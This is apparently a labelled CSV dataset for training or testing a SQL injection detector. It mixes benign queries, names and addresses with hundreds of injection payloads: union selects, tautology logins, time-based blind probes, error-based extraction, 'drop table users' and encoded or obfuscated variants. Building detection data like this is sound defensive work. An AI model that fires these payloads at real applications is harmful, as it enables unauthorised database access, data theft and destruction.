Query,Label,cluster,stratify_col
"1))union/*
*/select/*
*/1,database(),3--/*
*/",1,0,1_0
select * from feed where    not country = 'herself',0,5,0_5
"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",1,6,1_6
"-9046'   )    )    as ymqc where 3733  =  3733 union all select 3733,3733,3733,3733,3733,3733,3733--",1,4,1_4
"1and/*
*/1=1/**//*!*/and/**/1=1#6x7wfeohuhpat8
",1,6,1_6
"c/ 57 15, 9g",0,0,0_0
"  select orders.breadrid, employees.mountain, employees.compass from ordersright join employees on orders.employeeid  =  employees.societyid order by orders.vaporid",0,1,0_1
select supply,0,7,0_7
asander1@nutrimama.do,0,0,0_0
"%u0027%u0020union%u0020select%u0020null,%u0020null,%u0020null%u0020--%u0020--v41rh",1,2,1_2
-7758%'   )    )     )   or 3038  =  3038,1,6,1_6
" select * from doctor order by public asc, mirror desc",0,7,0_7
"select case,when*(select 6633))like (select 2077)>then/*)*/(select 1) elseÃ¢Â null end--",1,2,1_2
"test'or
'1'='1'--",1,9,1_9
hi' or (select (select (select 1x0x5)))=0b2or false or false~--,1,4,1_4
"0x1""  )   where|0x1eef=(select)(select (select 0x1eef))) and(char  ( 0o0b0b0b10101001100101111100101011010010010101110111010011111010101101010010100011101  )   or char  (; (select 0x4d)  ),   or  char ?(
 0x1b10001101} )  or char  (' 0b1010010/*{0x7>hl?mjt]i/o2*/ )    like  regexp_substring  (  repeat%	(  left? (  crypt_key; ( Ã¢Â char +(  0x41  )  ""or char  (  0o105& )   or char _(  0x53  )  ,null ') +,(select (select 0))( ) },0b7b1000111101111010011111011110111000110000090000110011000011001111000016111001001010101111011011  )  ,null  )   &&  (select (select|(select (select 6815))))=(select 0b1101811111) or&false}and~(select 0x42b7)=(select (select_9143))_ or  'm')like 'm,' or false ~or  (select (select (select (select (select (select 8)))))) or false or false?and true or "";""<>"";"" and true and true or 0o0xa7c=0xa7d or false and 1(and true or false  &&  true or '60'<>'60'  and  "")8""<>"")8~"" or false --",1,2,1_2
caca ihnen,0,8,0_8
"   select stranger,studying,minute,process,smaller     (  (  specific join means on order.loss =  correctly.sort )   inner join droppedon orders.plenty =  home.justid ) ",0,1,0_1
"and`(select (select 0o11))in   (  select var from,temp )  --",1,4,1_4
1%'  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1,4,1_4
"5""   ){  	)     )<  and!9x0x0o5o0o0xfec=(select 0o0x5c6xa)/ &&   
 (! <~(~   (& ""tuom"" ;=  ""tuom",1,2,1_2
"%u0027%u0020union%u0020select%u0020null,%u0020null,%u0020null%u0020%u0020#%u0020more_noise--%u0020",1,2,1_2
7uo09e5a1,0,3,0_3
"0x4%"">  )    )     )   and (select (select (select (select (select (select (select 0x826)))))))  like  utl_inaddr.get_host_address  (  chr  (  (select (select 113))  )   or chr  () (select 1xad)% )   or chr Ã¢Â (  (select 112)  )   ||;chr  (  0o122  )  ||chr{ (  (select 113) )	 or( (~ select   (  case when>  (::0xff0b110=(select (select (select (select (select 4180)))))  ) ` then (select(0x1) else (select 0x1)/*i)4wg`d|*/end  )   from dual& ) <||chr  (  (select (select (select (select (select 103)))))  )  ||chr  (  0x0x0o7c~ )  ||chr  (  (select 0o196)  )<@ or chr) (  (select 0x7a)  ) ):&or  chr  (, (select (select]113))   )    )    and]   (   or  false and[2x0o211b<>5620 and (select 0o0x1) or (select 0) and/**/true or}false or^0x0  or  false or false or false or 7x0 or false and true#/z*/j""bj+*/ (     (  ""%""=""t=_|ng'f\#>nrigca6`",1,4,1_4
select avg ( price ) from chief,0,1,0_1
select castle,0,7,0_7
select * from seldom where not union = 'drove'  and not window = 'liquid',0,5,0_5
select massage ( s ) from imagine inner join,0,1,0_1
"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,4,1_4
"  update very set anywhere =  'pressure', city =  'couple' where pay =  but",0,5,0_5
1980,0,3,0_3
-6086'   )    )    or   (  6719  =  7280  )  *7280 and    (    (   'ozbj'  =  'ozbj,1,9,1_9
"0x8' ||   ( select/*(select (select (select (select 0b2x9))))*/'gboi'where 0x105f like (select (select,(select+(select 0x715)))) and@7x6o4134 like`  (. select/*vv?e>*/count{ (+ * ;)\  from;domain.domainsas t1,domain.columns,as t0o2,domain.tables as\t4o0o3   )   *)
 /*(select (select 5))/0ih*/||'",1,9,1_9
0x8'   )   ])  Ã¢Â  as`iuta where (select (select 0xc6e)) ]=/*hifpep+*/1482,1,2,1_2
select * from glass  where sometime not like '[temperature]%',0,7,0_7
select single from invented union select pick from heading order by hospital,0,7,0_7
"' union select 1,2,3 # more_noise--",1,4,1_4
villanueva gualano,0,8,0_8
select * from trace,0,5,0_5
select avg ( price ) from our,0,1,0_1
piols padilla,0,8,0_8
"1""  )   as kndn where 9314  =  9314",1,6,1_6
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5#",1,1,1_1
"1   )    )    as bebl where 2597  =  2597   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,4,1_4
ip50,0,8,0_8
"   select zebra, market, adventure from court where different  is null",0,1,0_1
inoportunamente,0,8,0_8
6317860000000000,0,3,0_3
"1'   )    )    as qcgf where 9656  =  9656 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1_1
"c/ venus 91, 1e",0,0,0_0
1%' order by 1--,1,6,1_6
casaubn de rosa,0,0,0_0
select count ( possible )  from once,0,1,0_1
"0b1001o0b5o0x0b0o0b1010%'  +) ;  )/ 
 })   union and (select (select 0o0x1)) and 0b0o0b0b1001001100001^like](select (select/**/(select 0x157d))) or false && (select (select 0x1))~or;false and ""}""!=""}k"" or false^and ""p""<>""p5""+and true or
false#allselect null,null,null,null,null,null:&&  ""ch"" not) like  ""cht"" and true#b&b
ka
by;",1,2,1_2
;/**/drop/**/table/**/users;/**/--,1,0,1_0
select * from liquid order by pond,0,7,0_7
"1' where 9156  =  9156 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,4,1_4
select   (  case when   (  6804  =  7050  )   then 6804 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1,4,1_4
select catch ( s )  from field,0,1,0_1
echecopar torrella,0,8,0_8
"1%"" or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """,1,1,1_1
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 14594 )  order by meta_id asc",0,7,0_7
" select * from users{where;id  like< 0x0/*oto*/or \< =0b0b0x3 union`select (select (select (select (select 4x1)))),@@version or false -- 0x0b1dxb6",1,4,1_4
"1,
1)/*
*/ =	's'----gzmhhujw",1,0,1_0
"0o1%""   )    )     and  (select 0xc0o111)  like$ utl_inaddr.get_host_address  (  chr  (  0xad  ) %||chr  (  (select (select 0b0x0o110))[ );  or chr (  (select (select 0b0o0x0o157))  )?< or chr/*/+js?^*/ ( [0o4x6a  ) ||chr  (  (select%(select (select (select (select 0x0o103)))))  )||(\select   (  case when  ]( 0x0b0b0x2546cacea like 0o0x4b0o4b3x1407/*uwe$x<(,0xemz}) and ""s""<>""sc"" or false and trueor 0o0x0  &&  true and true and true or 'u' not like 'u' and 2x1d86 != (select (select (select (select (select (select (select 7559))))))) or (select 2x0) and-true and true or false or 0x0#:ie`oi m""5@mh{@*/ )   then 0b9x1 else(select (select (select (select (select (select 0x0)))))) end  ) ~(from dual  ),   or  chr  ( )113_ )  ||chr (  0x0x7a:)   or chr  (  0x0b0b1001100  )   || chr/*z* f;osjly*/ (  0x8x0o7a _) ||chr  (  (select (select (select (select (select (select (select (select (select 0x125)))))))))  :)    ) ~. and    ( >  ()  ""%""=""k~.m0m(iel?i4.zk_yg",1,4,1_4
"1'   )    )     )   and 0x29d7Ã¢Â  like   ^(  select count  (  *  )   from generate_series  (  (select (select (select 6))),(select (select
0x4f59ac))   )    )    and    (    (     (  'qgrt'='qgrt",1,9,1_9
select * from no where heard not like '[dog]%',0,7,0_7
"1%'  )   and make_set  (  1458  =  3902,3902  )   and   (  '%'  =  '",1,9,1_9
select * from slave order by wire,0,7,0_7
"'/**/andextractvalue(1,concat(0x5c,version()))--#afhazhjjxdie0/*
*/",1,0,1_0
"-6095""   )    )    as kgfp where 3601  =  3601 or 7287  =  9373#",1,6,1_6
select avg ( community )  from supper  select sum ( spring ) ,0,1,0_1
"6o15b0b1010101100"" rlike ? (  select * from  $(~ select  ( !sleep; (  (select""(select 0x5))?  )   Ã¢Â )    Ã¢Â ) ^sgvo  )  @and ""cxsu""{like ""cxsu",1,2,1_2
select top 3 * from son select * from race 3select * from year,0,5,0_5
select option_value from wp_options where option_name  =  'classic-editor-replace' limit 1,0,5,0_5
"	and]0o7x5b111x6b3xfx0o0x9x8x3o7^'=-/*&+r`f*/utl_inaddr.get_host_address	  ( ;  (   select global_name+from global_name "")+ ? )      and ~ 'i' ;;like : 'i",1,9,1_9
-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',1,9,1_9
' or '1'='1#o2sg4yn55xd2c4,1,9,1_9
afijacin,0,8,0_8
= '1,1,0,1_0
"9'   ).   ):_ > )   and updatexml  (\ (select (select (select (select (select 393))))),concat  (/ 0o0o0x0b10e,0b5x7171706a71,  (/**&*x*/ select  <(/ elt  (  (select@(select (select 0xd41))) =`(select (select (select 0xcf9))),8b0x3x4Ã¢Â   ){   ) 	  )  ,0o0x0o1615a0x2ffa0o7x57  )% ,0b8x489  )  and   (    (  *; (  'yqhk'| like and true   &&   4x1 or 0o3   &&   true	 &&  (select[(select (select(select (select 1)))))	 &&  ""n""=""n""  or  7x0 or false and 'f>' not like 'f>v' and true or 0x0xdc4 not like (select (select (select 0xdc5))) or false or false and true# 'yqhkxei,r;v.,xkb18`?",1,9,1_9
select count ( actually )  from brush,0,1,0_1
bernadita,0,8,0_8
19392,0,3,0_3
"0o1%' /*mz;]yy*/ ) %=) %   )\  union all$select null,null,null,null,null,null,null ||.6b0xeb24f4o1be4e not like (select (select)(select (select (select&(select (select 0x14c3)))))))> or  false or false or falseand ""y]g"" != ""y]gd""_and (select (select 0x1)) and true or 0'or false or false or false#u#?;-_}4",1,7,1_7
select * from factory where team = 'should',0,5,0_5
"1%u0027%u0020union%u0020select%u0020table_name,%u0020null,%u0020null%u0020from%u0020information_schema.tables%u0020 -- random_noise--",1,2,1_2
select count ( fly ) from series,0,1,0_1
select * from eventually where evidence like '%highway%',0,7,0_7
select avg ( setting ) from review select sum ( agree ) ,0,1,0_1
"  select ballid as id, table as fallen from frighten",0,7,0_7
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   ""zzmn""  =  ""zzmn",1,1,1_1
7674400000000000,0,3,0_3
select effect ( s from on right join,0,7,0_7
"1'/*!12345*/and substring(database(), 1, 1) = 's' --",1,9,1_9
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""%""  =  """,1,1,1_1
"%u0027%u0020a/*!12345*/nd%u00201=convert(int,@@version)--",1,0,1_0
pfeilsch,0,8,0_8
fromusers)--,1,0,1_0
"   select include, eaten, solidfrom die where partly  is not null",0,1,0_1
select * from neck where when = 'how' fetch first 3 rows only,0,5,0_5
select top 3 * from actual select * from moving 3select * from plate,0,5,0_5
select avg ( load ) from arrange,0,1,0_1
"4x0b1 where
(select
(select/**/0x1927))Ã¢Â likeÃ¢Â 5477",1,2,1_2
"0o6
:)-[`as lisgwhere_(select=(select (select 2x1572)))/**/ =Ã¢Â  1490",1,2,1_2
"' and 1 =  convert(int,@@version) or 'b' =  'b'--",1,9,1_9
"0b0o13   )    )    or 0b1101010401159=( ( /**/select (select 7x1a09) from pg_sleep 
(Ã¢Â  (select (select (select (select (select (select 5))))))   ) `? )  
 and    (/**/   (
 $(select 0x1b0o11d)  
 like    0xbfd",1,4,1_4
delete from organization,0,7,0_7
select avg ( plan ) from aboard,0,1,0_1
select * from born 3 select * from us,0,5,0_5
"""_or`sleep?((<&__time__Ã¢Â &)[*+<=
]""",1,2,1_2
";drop/*
*/tableusers;/*
*/--",1,0,1_0
'    and    1	= 1    -- ,1,6,1_6
1%'   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  '%'  =  ',1,9,1_9
' or exists(select 1 from users)--#fbogth263ck9kq9,1,4,1_4
-1879%'   )    )    or 3038  =  3038,1,6,1_6
select * from garden where mood between 'possible' and 'wood',0,5,0_5
"-1134"" union all select 4865,4865,4865,4865,4865#",1,4,1_4
"  select * from pressure where cowboy not in  ( 'apple', 'remain', 'month' )  ",0,5,0_5
"%u0027%u0020union%u0020select%u00201,2,3--",1,2,1_2
"1"" 	)     or   row  (  (select (select>(select (select (select (select (select 1045))))))),(select 3x2533)  )  >  ({ select count  (  *  )  ,concat  (  0x0x7670707a71,  (  select 	 (  elt  (  (select (select (select 1255)))  like  0b50000710101,0x1(  ) ~  )     ){ ,0x717a767a71,flo  or  ` ([ r  and   ( /**/0b0o0|)  *(select 0o0b0o12)   )   })   x from   (  select (select 0x2128) union~select (select (select (select (select (select 5584))))) union select 0b0xbeb union select 0o0x4ba  )+ a group by x  )   and   (  ""ngnd"" like ""ngnd",1,4,1_4
0b1:)>/**//*lf*/as?bhdj|whereÃ¢Â 0o0x1178&>=/*c*/ 0b1110100110000,1,2,1_2
-9553   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   5299  =  5299,1,4,1_4
"-select *?from users
where[id<$=  0b2b0b4 or \<\ union select (select 0o4x8),@@version~ and@true?and_true or false --/*lmuv""?on*/3f)x",1,2,1_2
"iif  (  1305  =  5656,1,1/0  )  ",1,6,1_6
artigas girut,0,8,0_8
"1""   )    )     )   union all select null#",1,4,1_4
admin'		or		'1' =	'1,1,9,1_9
0b1'_where	(select 4795)=0x12a7 and 1595; like/*v\?ke*/ 0o10763'or!false and true or false#;@u,1,7,1_7
43751883h,0,3,0_3
admin%u0027%u0020o/**/r%u0020%u00271%u0027=%u00271,1,2,1_2
1'||  (  select 'tznb' from dual where 8808  =  8808 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,4,1_4
"1o6'+  (  select(llcl'where@0o2x0o130c  like+}0b5b6x1ffc   and  ""(select (select/*m)!
v<o:e8f[zkpclvg^8"";{trsh+k4tvp=	ca*/(select 0o2xa9c)))  like_ 	 ( }select count; (  *< )  
from sysusers or false or ""mi""!=""mi""  &&  ""jba or false and 3x143f<>(select (select 0o12100)) or false or 1x0 or false#""!=""jba#!""#as!sys9,sysusers{as
sys8,sysusers as sys0b10,sysusers	as;sys0o0o0b100,sysusers assys0,sysusers as sys0b10,sysusers as sys6o7_})  and''	qe;s'}like&' qe;s'	andÃ¢Â true  && \(select (select 0x0))  or  false   or;} false or "">g{"" not*like "">g{""    &&   ''7' not like""'18' or 0x0o5xb33\not
like 0xb93 or false  or }(select (select 0x1)) or false&&true%or ""m"" like ""mf""
or false'--
zo[:irz~<z:)",1,2,1_2
8678590000000000,0,3,0_3
rakin,0,8,0_8
"1""  )   where 6236  =  6236 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1,4,1_4
empece9ora,0,8,0_8
doce de novembro 165,0,0,0_0
select ruler ( s )  from liquid,0,1,0_1
"-3452%' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  '",1,9,1_9
" or username)like char	 orÃ¢Â 0xa89 not like (select 0b1010111001)#( Ã¢Â (select 31)/*	*!?pt*/[)  hkh",1,2,1_2
-5880'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rwgl'  =  'rwgl,1,9,1_9
select * from person,0,5,0_5
"0o0x1'^  and   exp} (  ~  (  select *:from   (  select concat [(  0x5121706a71,  (/ select  >(  elt *( [0o0b0x0ffe  like/*cj:lclljxqe9yoz?*/ (select (select 0x0b0b0x1ffe)),0x6o4   )   ^)! ;  )%"",0x5o1315a767a30,0o0x0x4e   )>   )   x   )   ?)   ] and ;'blie'? like  'blie",1,9,1_9
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   'uorw' like 'uorw",1,9,1_9
"3' where>(select!(select (select (select-1623)))) 	like 
1223",1,4,1_4
armintario,0,8,0_8
"test'/**/or'1'<='1'/*
*/--/*
*//*
*/",1,9,1_9
6748550000000000,0,3,0_3
select * from told where needed  between 10 and 20,0,5,0_5
basta@24htranslations.edu,0,0,0_0
yuvia,0,8,0_8
"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,4,1_4
select * from atomic fetch first 3 rows only,0,0,0_0
fuente de piedra,0,0,0_0
select volume ( s ) from field inner join,0,1,0_1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",1,1,1_1
"8  )   where (select 8x9fe0b1001o5)= 0o47724 or (select 0x93f)~/*>(select (select (select 0)))?*t+!h:*/ like     (=(select count  (  * );  from rdb$fields as t0o9,rdb$types=ast0o10,rdb$collations as t3,rdb$functions^as t0b190 *) \ and }0o0o0b0o6 or?'_?'='_?k' and 0x0b10  or  false or false and true and;(select (select (select 1)))%and true and true  and  true`and true or ""pp&""<>""pp&"" or false --",1,2,1_2
"1'/**/and/**/substring(database(),/**/1,/**/1)/**/like/**/'s'/**/--#70jco2ol",1,9,1_9
select column_name from table_name where condition group by column_name having condition order by  column_name,0,7,0_7
"1'   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ozan'  =  'ozan",1,9,1_9
"1"" or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,1,1_1
"   select can, egg, porch from fully where bread  is null",0,1,0_1
"0o1'	  )   )) ""/  or@?(select<(select (select 2x0b0xa8c))){	
 like -(  ;(  select count ;(&`*  )_  fromall_users$t0o0x0o0b110o8x7,all_users t0o0o0x0x0b0b1010,all_users_t7,all_users:t0b1,all_users t0o0o3o3 ;) [	and}   (   )(  :'fvov' 
=|;'fvov",1,9,1_9
"7""`  ) /*~\;c
(select 2x0b110){uie	{%nnjb*/ /)  {  )   or (select (select
9x5a7)), like $ !;(  select count/&(  *  )  ;from domain.domains as t0,domain.columnsas t0o5,domain.tables\as t0b100  )"".and ;  ( ?~(    (  ""nthu""=""nthu",1,2,1_2
"0o3'  )   where (select (select (select 1021)))+$=  1027 and  `(  select 0o9o21553 from  (  select count  ( `*  )  ,concat  ( ;0x0b0o0b0b111011100110011011011110800160011010010111110011100111101101100101000111100104110a0b1000111,  (. select   (  elt  (  0b10001101101011  =/ 3x436b,(select (select 0x1))   )    )     )  ,0x717a767a71,flo or  ~(  rand  ( ](select (select (select (select 0))))  )  *2 
/)  : )   x from inf||mation_schema.character_sets group by x )  a  ) {or false,or/false && true  ||  false
and (select 1)_--",1,4,1_4
1'  )   where 5378  =  5378,1,6,1_6
"1 where 3799  =  3799 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",1,4,1_4
"1%u0027%u0020un/**/ion%u0020select%u0020table_name,%u0020null,%u0020null%u0020from%u0020information_schema.tables%u0020%u0020--%u0020random_noise--",1,2,1_2
-1643' where 1968  =  1968 or 3484  =  6642,1,6,1_6
calle tras do colexio s/n,0,0,0_0
"0b8%""  	)= ) .   )   and%(select (select (select 0x1b39)))  like    (  select	0o0x0b0b0b1110101100011001010011111000111010000000111111011011101101011111000101010001111011000111010011100000010110101000010110101100001110101^from pg_sleep  (  0x5  _) [  ) ^ +  &&     (    ({    (  ""%""=)=  """,1,2,1_2
"  select topicid as id, pipe as went from kitchen",0,7,0_7
"!select * from userswhere id like 1or ""	 )+?.""  like) (select#(select 1)) or 0b0x8=0b0b12  or  (select (select 0)) and true -- 1m",1,2,1_2
"1'or/*
*/if(substring(database(),1,1)<='a',sleep(5),0)--",1,9,1_9
"1' or ascii(substring(database(), 1, 1)) > 100 --#00ka0yb",1,0,1_0
select storm,0,7,0_7
52310665v,0,3,0_3
select * from anyone fetch first 3 rows only,0,0,0_0
"-3790""  )   as ojgb where 5925  =  5925 union all select 5925,5925#",1,6,1_6
select kept ( s )  from old select actual ( s ) ,0,1,0_1
'/**/or/**/exists(sel/**/ect/**/1/**/from/**/users)--,1,0,1_0
1' where 6583  =  6583,1,6,1_6
 (  select   (  case when   (  9066  =  5598  )   then 1 else 9066*  (  select 9066 from information_schema.character_sets  )   end   )    ) ,1,4,1_4
"1  &&  0x0o11a0o7  like  ctxsys.drithsx.sn  (  0b0x50a7,  (, chr  (+ (select (select (select (select (select (select 0xa5))))))| )   or chr -(  0x71 ;)  ||chr  ( (select 0x70)  )    or  chr  (  (select (select (select 0x38a))) >)     or ^ chr  (  (select/**/(select 0x71))  )  or  (  selectÃ¢Â + (* case when   (  (select 7x67a7)=  0x15a3  )   then (select (select (select (select (select 0b1))))) else (select`9o0)~end, )   from dual ]);   or  chr  (  0x71  )   or chr 
(  (select 0b0o3x9o172)  )   or chr :(  0x98* )   or chr  (  z8h*/(select (select 0x80))  )    or  chr (  0x32d   ) 	  ) (   )  ",1,4,1_4
"plaa doctor robert, 127",0,0,0_0
select min ( pine )  as ants from orange,0,1,0_1
"1""   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   ""opgb"" like ""opgb",1,1,1_1
"granados 151,",0,0,0_0
1/**/and/**/1>=1#gi1ez,1,6,1_6
"1'||  (  select 'ggfx' where 4932  =  4932 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",1,9,1_9
"5'  or    ( ;select 'ejuu' from?dual where (select 2b101101910712)\= (select (select (select 0o0x1327)))% &&  (select](select 8b0o2xe7b)) like  (+ select?count	 (. *  )& 	from sysibm.systables as(t1,sysibm.systables as t9,sysibm.systables
ast3+  ) ? ~)+ 	 or '",1,9,1_9
"1""  )   where 1870  =  1870 union all select null,null,null,null,null,null,null,null--",1,4,1_4
"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'aduc'  =  'aduc",1,9,1_9
1 where 1931  =  1931 and sleep  (  5  )  --,1,6,1_6
 and 1  =  utl_inaddr.get_host_address   (    (   select count  (  distinct  (  table_name   )    )    from sys.all_tables   )    )    and 'i'  =  'i,1,4,1_4
select column_name from table1 union,0,7,0_7
"1"" union all select null,null,null,null,null--",1,4,1_4
" select{* from users where id like (select (select 1)) or{6o0x0x1:and true or ""p""<>""p""#""8 union select version  ({Ã¢Â   )  ,version ;(    )   --^0x1ck",1,2,1_2
"0o0o2b0x1""  )  ? ) }  :)   or|0b0x0x91860ee8f0f /  like    +/*(select (select (select (select (select (select (select (select (select (select (select 8)))))))))))*/(< select count  (  * !)   from sysibm.systables as t5o4,sysibm.systablesas t0o0b0b1101b1b5010,sysibm.systables as t3  ) .&&/*ghz*/  (  ; (     (: ""gimc"" like|""gimc",1,2,1_2
"-3865'  )   union all select 4935,4935,4935,4935,4935--",1,4,1_4
select * from damage where telephone not between 'than' and 'fog',0,5,0_5
" select * from glass order by rabbit asc, lay desc",0,7,0_7
"  select orders.clearrid, employees.dull, employees.corn from ordersright join employees on orders.employeeid  =  employees.locateid order by orders.jumpid",0,1,0_1
%u0027%u0020and%u00201=1%u0020--%u0020#4ztxr,1,2,1_2
"admin"";or\""7o0b0x5b0b0b0o0b101""]/*^)n,e!kp=j0o73spon*/=|~""0o9b8b3b7""/*",1,2,1_2
"'unionselect/*
*/1,2,3--
#p6d69zlhl",1,0,1_0
"  select * from wood where empty in  ( 'stay', 'scale', 'beginning' )  ",0,5,0_5
tomono@esteticadayda.az,0,0,0_0
1'  )   where 3311  =  3311,1,6,1_6
"1' or ascii(substring(database(), 1, 1)) > 100 -- or (1)",1,0,1_0
' or '1'='1 # more_noise,1,9,1_9
test%u0027%u0020oR%u0020%u00271%u0027=%u00271%u0027%u0020--%u0020,1,2,1_2
select * from willing where fall = 'track' limit 3,0,5,0_5
";droptableusers;--
",1,0,1_0
"-1907""   )    )    or 2782  =  3591",1,6,1_6
"0o1"")(and:0x9d0=0o0o11160#)=~=where[0x0b101001111100>=.<9836f&lap3",1,6,1_6
"  select heartid as id, dawn as behavior from opposite",0,7,0_7
%u0027/*!*/and%u0020%u0020%u0020%u00201%u0020=%u00201%u0020%u0020%u0020%u0020--%u0020%u0020%u0020%u0020,1,2,1_2
"1'>where{(select\0o0o0b0o0b1010011111100001011100001101110110101)(=](7x0x6x0b11bd/*j0b0b0o0o6?m}mh0b4*xpu}dp>1;,*/union}all!select{null,null,null,null,null,null,null,null,null,null--",1,4,1_4
select * from users where id  =  '1' or \<\. or 1  =  1 -- 1',1,5,1_5
select count ( fliesid ) from grandfather,0,1,0_1
"' && (1=1)1=convert(int,@@version)--#rccy3lhlv2",1,6,1_6
cantabria,0,8,0_8
""">or 0o0b10like (select (select 8x0)):and;""b""=""b""|or false --",1,2,1_2
waitfor%u0020delay%u0020%u00270:0:5%u0027--,1,2,1_2
hermanos gascon 141,0,0,0_0
select count ( topicid ) from grandmother,0,1,0_1
" select * from magnet order by author, rush",0,7,0_7
coxcojita,0,8,0_8
"1%"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,1,1_1
"  select richid as id, influence as rear from now",0,7,0_7
"0o9b1x0b0o0b0o145o0o10%""r=`  (  select * from   ( <select  (? sleep  ((0o0   ) \; )	    )  sgvo;)   / ;&&  * ""%"">` like[< """,1,2,1_2
select top 50 percent * from writing,0,5,0_5
